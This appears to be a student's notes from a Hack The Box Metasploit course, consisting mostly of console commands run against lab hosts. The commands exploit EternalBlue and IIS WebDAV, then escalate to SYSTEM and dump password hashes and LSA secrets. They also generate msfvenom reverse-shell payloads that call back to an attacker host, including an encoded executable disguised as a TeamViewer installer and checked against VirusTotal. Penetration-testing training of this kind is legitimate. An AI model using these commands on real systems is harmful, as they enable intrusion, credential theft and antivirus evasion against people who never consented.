## Introduction

#### Introduction to Metasploit
```
## Understanding the Architecture

areaeric@htb[/htb]$ ls /usr/share/metasploit-framework/modules

areaeric@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

areaeric@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/

areaeric@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
```

## MSF Components

#### Modules
```
## Searching for Modules

msf6 > help search

msf6 > search eternalromance
msf6 > search eternalromance type:exploit

msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

## Module Selection

areaeric@htb[/htb]$ nmap -sV 10.10.10.40

msf6 > search ms17_010

## Using Modules

msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

msf6 exploit(windows/smb/ms17_010_psexec) > info

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > options

msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > options

msf6 exploit(windows/smb/ms17_010_psexec) > run
meterpreter> shell

C:\Windows\system32> whoami

## Questions
Q1: DIrectly follow from section
```

#### Targets
```shell-session
msf6 > show targets

msf6 exploit(windows/browser/ie_execcommand_uaf) > info

msf6 exploit(windows/browser/ie_execcommand_uaf) > options
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
```

#### Payloads
```
## Searching for Payloads

msf6 > show payloads

msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

## Selecting Payloads

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

## Using Payloads

msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

msf6 exploit(windows/smb/ms17_010_eternalblue) > run

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid

meterpreter > help
	
meterpreter > cd Users
meterpreter > ls

meterpreter > shell

C:\Users>dir
C:\Users>whoami

## Questions
- Directly follow from section, but also requires:
	- Nmap scan
	- accessing the website
	- Searching the module (Apache Druid)
	- Using the rce module
	- setting the various parameters for the module
(Meterpreter 1)(/root/druid) > search flag.txt
(Meterpreter 1)(/root/druid) > cat /root/flag.txt
```

#### Encoders
```shell-session
## Selelcting an encoder

areaeric@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

areaeric@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

areaeric@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

areaeric@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

areaeric@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

#### Databases
```shell-session

## Setting up the Database

areaeric@htb[/htb]$ sudo service postgresql status

areaeric@htb[/htb]$ sudo service postgresql status

areaeric@htb[/htb]$ sudo msfdb init

areaeric@htb[/htb]$ sudo msfdb init

areaeric@htb[/htb]$ sudo msfdb status

areaeric@htb[/htb]$ sudo msfdb init

areaeric@htb[/htb]$ sudo msfdb run

areaeric@htb[/htb]$ msfdb reinit
areaeric@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
areaeric@htb[/htb]$ sudo service postgresql restart
areaeric@htb[/htb]$ msfconsole -q

msf6 > help database
msf6 > db_status

## Using the database

msf6 > workspace
msf6 > workspace -a Target_1
msf6 > workspace Target_1 
msf6 > workspace

msf6 > workspace -h

## Importing Scan Results

areaeric@htb[/htb]$ cat Target.nmap

msf6 > db_import Target.xml

## Using Nmap Inside MSFConsole

msf6 > db_nmap -sV -sS 10.10.10.8

## Data Backup

msf6 > db_export -h
msf6 > db_export -f xml backup.xml

## Hosts/Services/Credentials/Loot

msf6 > hosts -h

msf6 > services -h

msf6 > creds -h

msf6 > loot -h
```

#### Plugins
```
## Using Plugins

areaeric@htb[/htb]$ ls /usr/share/metasploit-framework/plugins

msf6 > load nessus

msf6 > load Plugin_That_Does_Not_Exist

[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb

## Installing new Plugins

areaeric@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
areaeric@htb[/htb]$ ls Metasploit-Plugins

areaeric@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb

areaeric@htb[/htb]$ msfconsole -q
msf6 > load pentest
msf6 > help
```

## MSF Sessions

#### Sessions & Jobs
```
## Using Sessions

- `[CTRL] + [Z]` or `background` to background session

msf6 exploit(windows/smb/psexec_psh) > sessions

msf6 exploit(windows/smb/psexec_psh) > sessions -i 1

## Jobs

msf6 exploit(multi/handler) > jobs -h

msf6 exploit(multi/handler) > exploit -h

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

msf6 exploit(multi/handler) > jobs -l

## Questions

Q1: sudo nmap -sV 10.129.180.111, browse to website to find.
Q2: Find elFinder exploit and run it. 
Q3: Follow directly from section, but need to found exploit using version (1.8.31)
```

#### Meterpreter
```
## Using Meterpreter

meterpreter > help

msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

msf6 > hosts

msf6 > services

msf6 > search iis_webdav_upload_asp

msf6 > use 0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

meterpreter > getuid

meterpreter > steal_token 1836
Stolen token with username: NT AUTHORITY\NETWORK SERVICE
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

c:\Inetpub>dir

c:\Inetpub>cd AdminScripts

meterpreter > bg
Background session 1? [y/N]  y
msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images
msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
msf6 exploit(windows/local/ms15_051_client_copy_image) > run
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

## Questions
Q1. sudo nmap -sV 10.129.203.65, then follow section, search for exploit.
Q2 Follow directly from section
```

## Additional Features

#### Writing and importing Modules
```
## Searching and importing modules

- Look up at exploit db 

msf6 > search nagios

areaeric@htb[/htb]$ searchsploit nagios3

areaeric@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"

areaeric@htb[/htb]$ ls /usr/share/metasploit-framework/

areaeric@htb[/htb]$ ls .msf4/

areaeric@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
areaeric@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/

msf6> loadpath /usr/share/metasploit-framework/modules/

msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
msf6 exploit(unix/webapp/nagios3_command_injection) > show options
```

#### Introduction to MSFVenom
```
## Creating Our Payloads

areaeric@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5

areaeric@htb[/htb]$ ftp 10.10.10.5
Password: ******
ftp> ls
03-18-17  02:06AM       <DIR>          aspnet_client
...

areaeric@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

areaeric@htb[/htb]$ ls

areaeric@htb[/htb]$ msfconsole -q 
msf6 > use multi/handler
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run

## Executing the payload

- Go to the page containing the payload

meterpreter > getuid

## Local Exploit Suggester

msf6 > search local exploit suggester
msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options
msf6 post(multi/recon/local_exploit_suggester) > set session 2
msf6 post(multi/recon/local_exploit_suggester) > run

msf6 exploit(multi/handler) > search kitrap0d
msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

